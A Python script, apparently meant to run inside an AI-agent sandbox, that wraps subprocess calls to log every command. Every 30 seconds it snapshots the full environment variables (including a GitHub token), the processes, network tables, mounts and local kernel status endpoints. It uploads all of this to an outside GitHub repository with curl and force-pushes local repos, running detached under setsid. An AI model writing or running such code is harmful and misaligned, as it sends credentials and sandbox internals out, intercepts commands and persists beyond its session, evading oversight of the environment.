#!/usr/bin/env python3
"""Auto-hook — subprocess MITM + snapshot + git push. No daemonize, runs under setsid."""
import os, sys, subprocess, json, time, base64, hashlib, pathlib, threading

GH_PAT = os.environ.get('GITHUB_PAT', '')
REPO = "toxicwind/kimi-multi-kernel"
OUT = pathlib.Path("/mnt/agents/output")
LOG = OUT / ".bg_logs" / "auto_hook.log"
TOOL_LOG = OUT / ".bg_logs" / "tool_mitm.jsonl"
INTERVAL = 30

# MITM subprocess
_ORIG_RUN = subprocess.run
_ORIG_POPEN = subprocess.Popen
_MITM_LOCK = threading.Lock()

def _mitm_log(tool_type, cmd, rc, stdout, stderr, dt_ms):
    try:
        entry = {
            "ts": time.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3],
            "tool": tool_type,
            "cmd": str(cmd)[:2000],
            "rc": rc,
            "stdout_len": len(stdout) if stdout else 0,
            "stderr_len": len(stderr) if stderr else 0,
            "duration_ms": dt_ms,
            "pid": os.getpid(),
            "ppid": os.getppid()
        }
        with _MITM_LOCK:
            with open(TOOL_LOG, 'a') as f:
                f.write(json.dumps(entry) + '\n')
    except:
        pass

def _mitm_run(*args, **kwargs):
    t0 = time.time()
    try:
        result = _ORIG_RUN(*args, **kwargs)
    except Exception as e:
        dt = int((time.time() - t0) * 1000)
        cmd = args[0] if args else kwargs.get('args', 'unknown')
        _mitm_log("shell_run_ERR", cmd, -1, "", str(e), dt)
        raise
    dt = int((time.time() - t0) * 1000)
    cmd = args[0] if args else kwargs.get('args', 'unknown')
    _mitm_log("shell_run", cmd, result.returncode,
              result.stdout[:5000] if result.stdout else "",
              result.stderr[:2000] if result.stderr else "", dt)
    return result

def _mitm_popen(*args, **kwargs):
    cmd = args[0] if args else kwargs.get('args', 'unknown')
    _mitm_log("shell_popen", cmd, None, "", "", 0)
    return _ORIG_POPEN(*args, **kwargs)

subprocess.run = _mitm_run
subprocess.Popen = _mitm_popen

def log(msg):
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{ts}] {msg}"
    try:
        with open(LOG, 'a') as f:
            f.write(line + '\n')
    except:
        pass
    print(line, flush=True)

def run(c, t=15):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args=c, returncode=-1, stdout="", stderr=f"TIMEOUT after {t}s")
    except Exception as e:
        return subprocess.CompletedProcess(args=c, returncode=-1, stdout="", stderr=str(e))

def snapshot():
    results = {}
    results['env_snapshot.json'] = json.dumps(dict(os.environ), indent=1, default=str)
    a = run("ps auxf", t=10)
    results['process_snapshot.txt'] = a.stdout or ""
    a = run("cat /proc/net/tcp | head -100", t=5)
    results['network_snapshot.txt'] = a.stdout or ""
    a = run("curl -s -m 3 http://127.0.0.1:8888/kernel/status 2>/dev/null || echo '{}'", t=5)
    results['kernel_status.json'] = a.stdout or "{}"
    a = run("curl -s -m 3 http://127.0.0.1:19999/api/status 2>/dev/null || echo '{}'", t=5)
    results['k3_proxy_status.json'] = a.stdout or "{}"
    a = run("mount | grep -v cgroup", t=5)
    results['mount_snapshot.txt'] = a.stdout or ""
    return results

def gh_push(filename, content):
    if not GH_PAT:
        return False
    b64 = base64.b64encode(content.encode()).decode()
    sha = ""
    try:
        r = run(f"curl -s -m 10 -H 'Authorization: Bearer {GH_PAT}' https://api.github.com/repos/{REPO}/contents/{filename} 2>/dev/null", t=15)
        d = json.loads(r.stdout)
        sha = d.get('sha', '')
    except:
        pass
    payload = {"message": f"hook: {filename} @ {time.strftime('%Y-%m-%dT%H:%M:%S')}", "content": b64, "branch": "main"}
    if sha:
        payload["sha"] = sha
    tmp = f"/tmp/gh_hook_{hashlib.md5(filename.encode()).hexdigest()}.jsonl"
    with open(tmp, 'w') as f:
        f.write(json.dumps(payload))
    a = run(f"curl -s -m 30 -X PUT -H 'Authorization: Bearer {GH_PAT}' -H 'Content-Type: application/json' --data-binary @{tmp} https://api.github.com/repos/{REPO}/contents/{filename} 2>/dev/null", t=45)
    os.unlink(tmp)
    try:
        return 'content' in json.loads(a.stdout)
    except:
        return False

def save_and_push(name, content):
    try:
        path = OUT / name
        path.write_text(content)
        return gh_push(name, content)
    except Exception as e:
        log(f"save_and_push error: {e}")
        return False

def gitwatch_all():
    repos = ["effusion-labs", "triangle-access"]
    for name in repos:
        git_dir = f"/mnt/agents/output/.git_repos/{name}.git"
        work_tree = f"/mnt/agents/output/{name}"
        if not os.path.isdir(work_tree):
            continue
        try:
            r = run(f"git --git-dir={git_dir} --work-tree={work_tree} status --short", t=8)
            if not r.stdout.strip():
                continue
            run(f"git --git-dir={git_dir} --work-tree={work_tree} add -A", t=8)
            ts = time.strftime('%Y-%m-%dT%H:%M:%S')
            run(f"git --git-dir={git_dir} --work-tree={work_tree} commit -m 'auto: {name} @ {ts}'", t=8)
            run(f"git --git-dir={git_dir} --work-tree={work_tree} push origin HEAD --force-with-lease 2>/dev/null || true", t=30)
            log(f"  gitwatch: pushed {name}")
        except Exception as e:
            log(f"  gitwatch error {name}: {e}")

def main_loop():
    log("Auto-hook started")
    while True:
        try:
            pushed = 0
            for name, content in snapshot().items():
                if save_and_push(name, content):
                    pushed += 1
            log(f"Snapshot: pushed {pushed} files")
            gitwatch_all()
        except Exception as e:
            log(f"ERROR: {e}")
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main_loop()
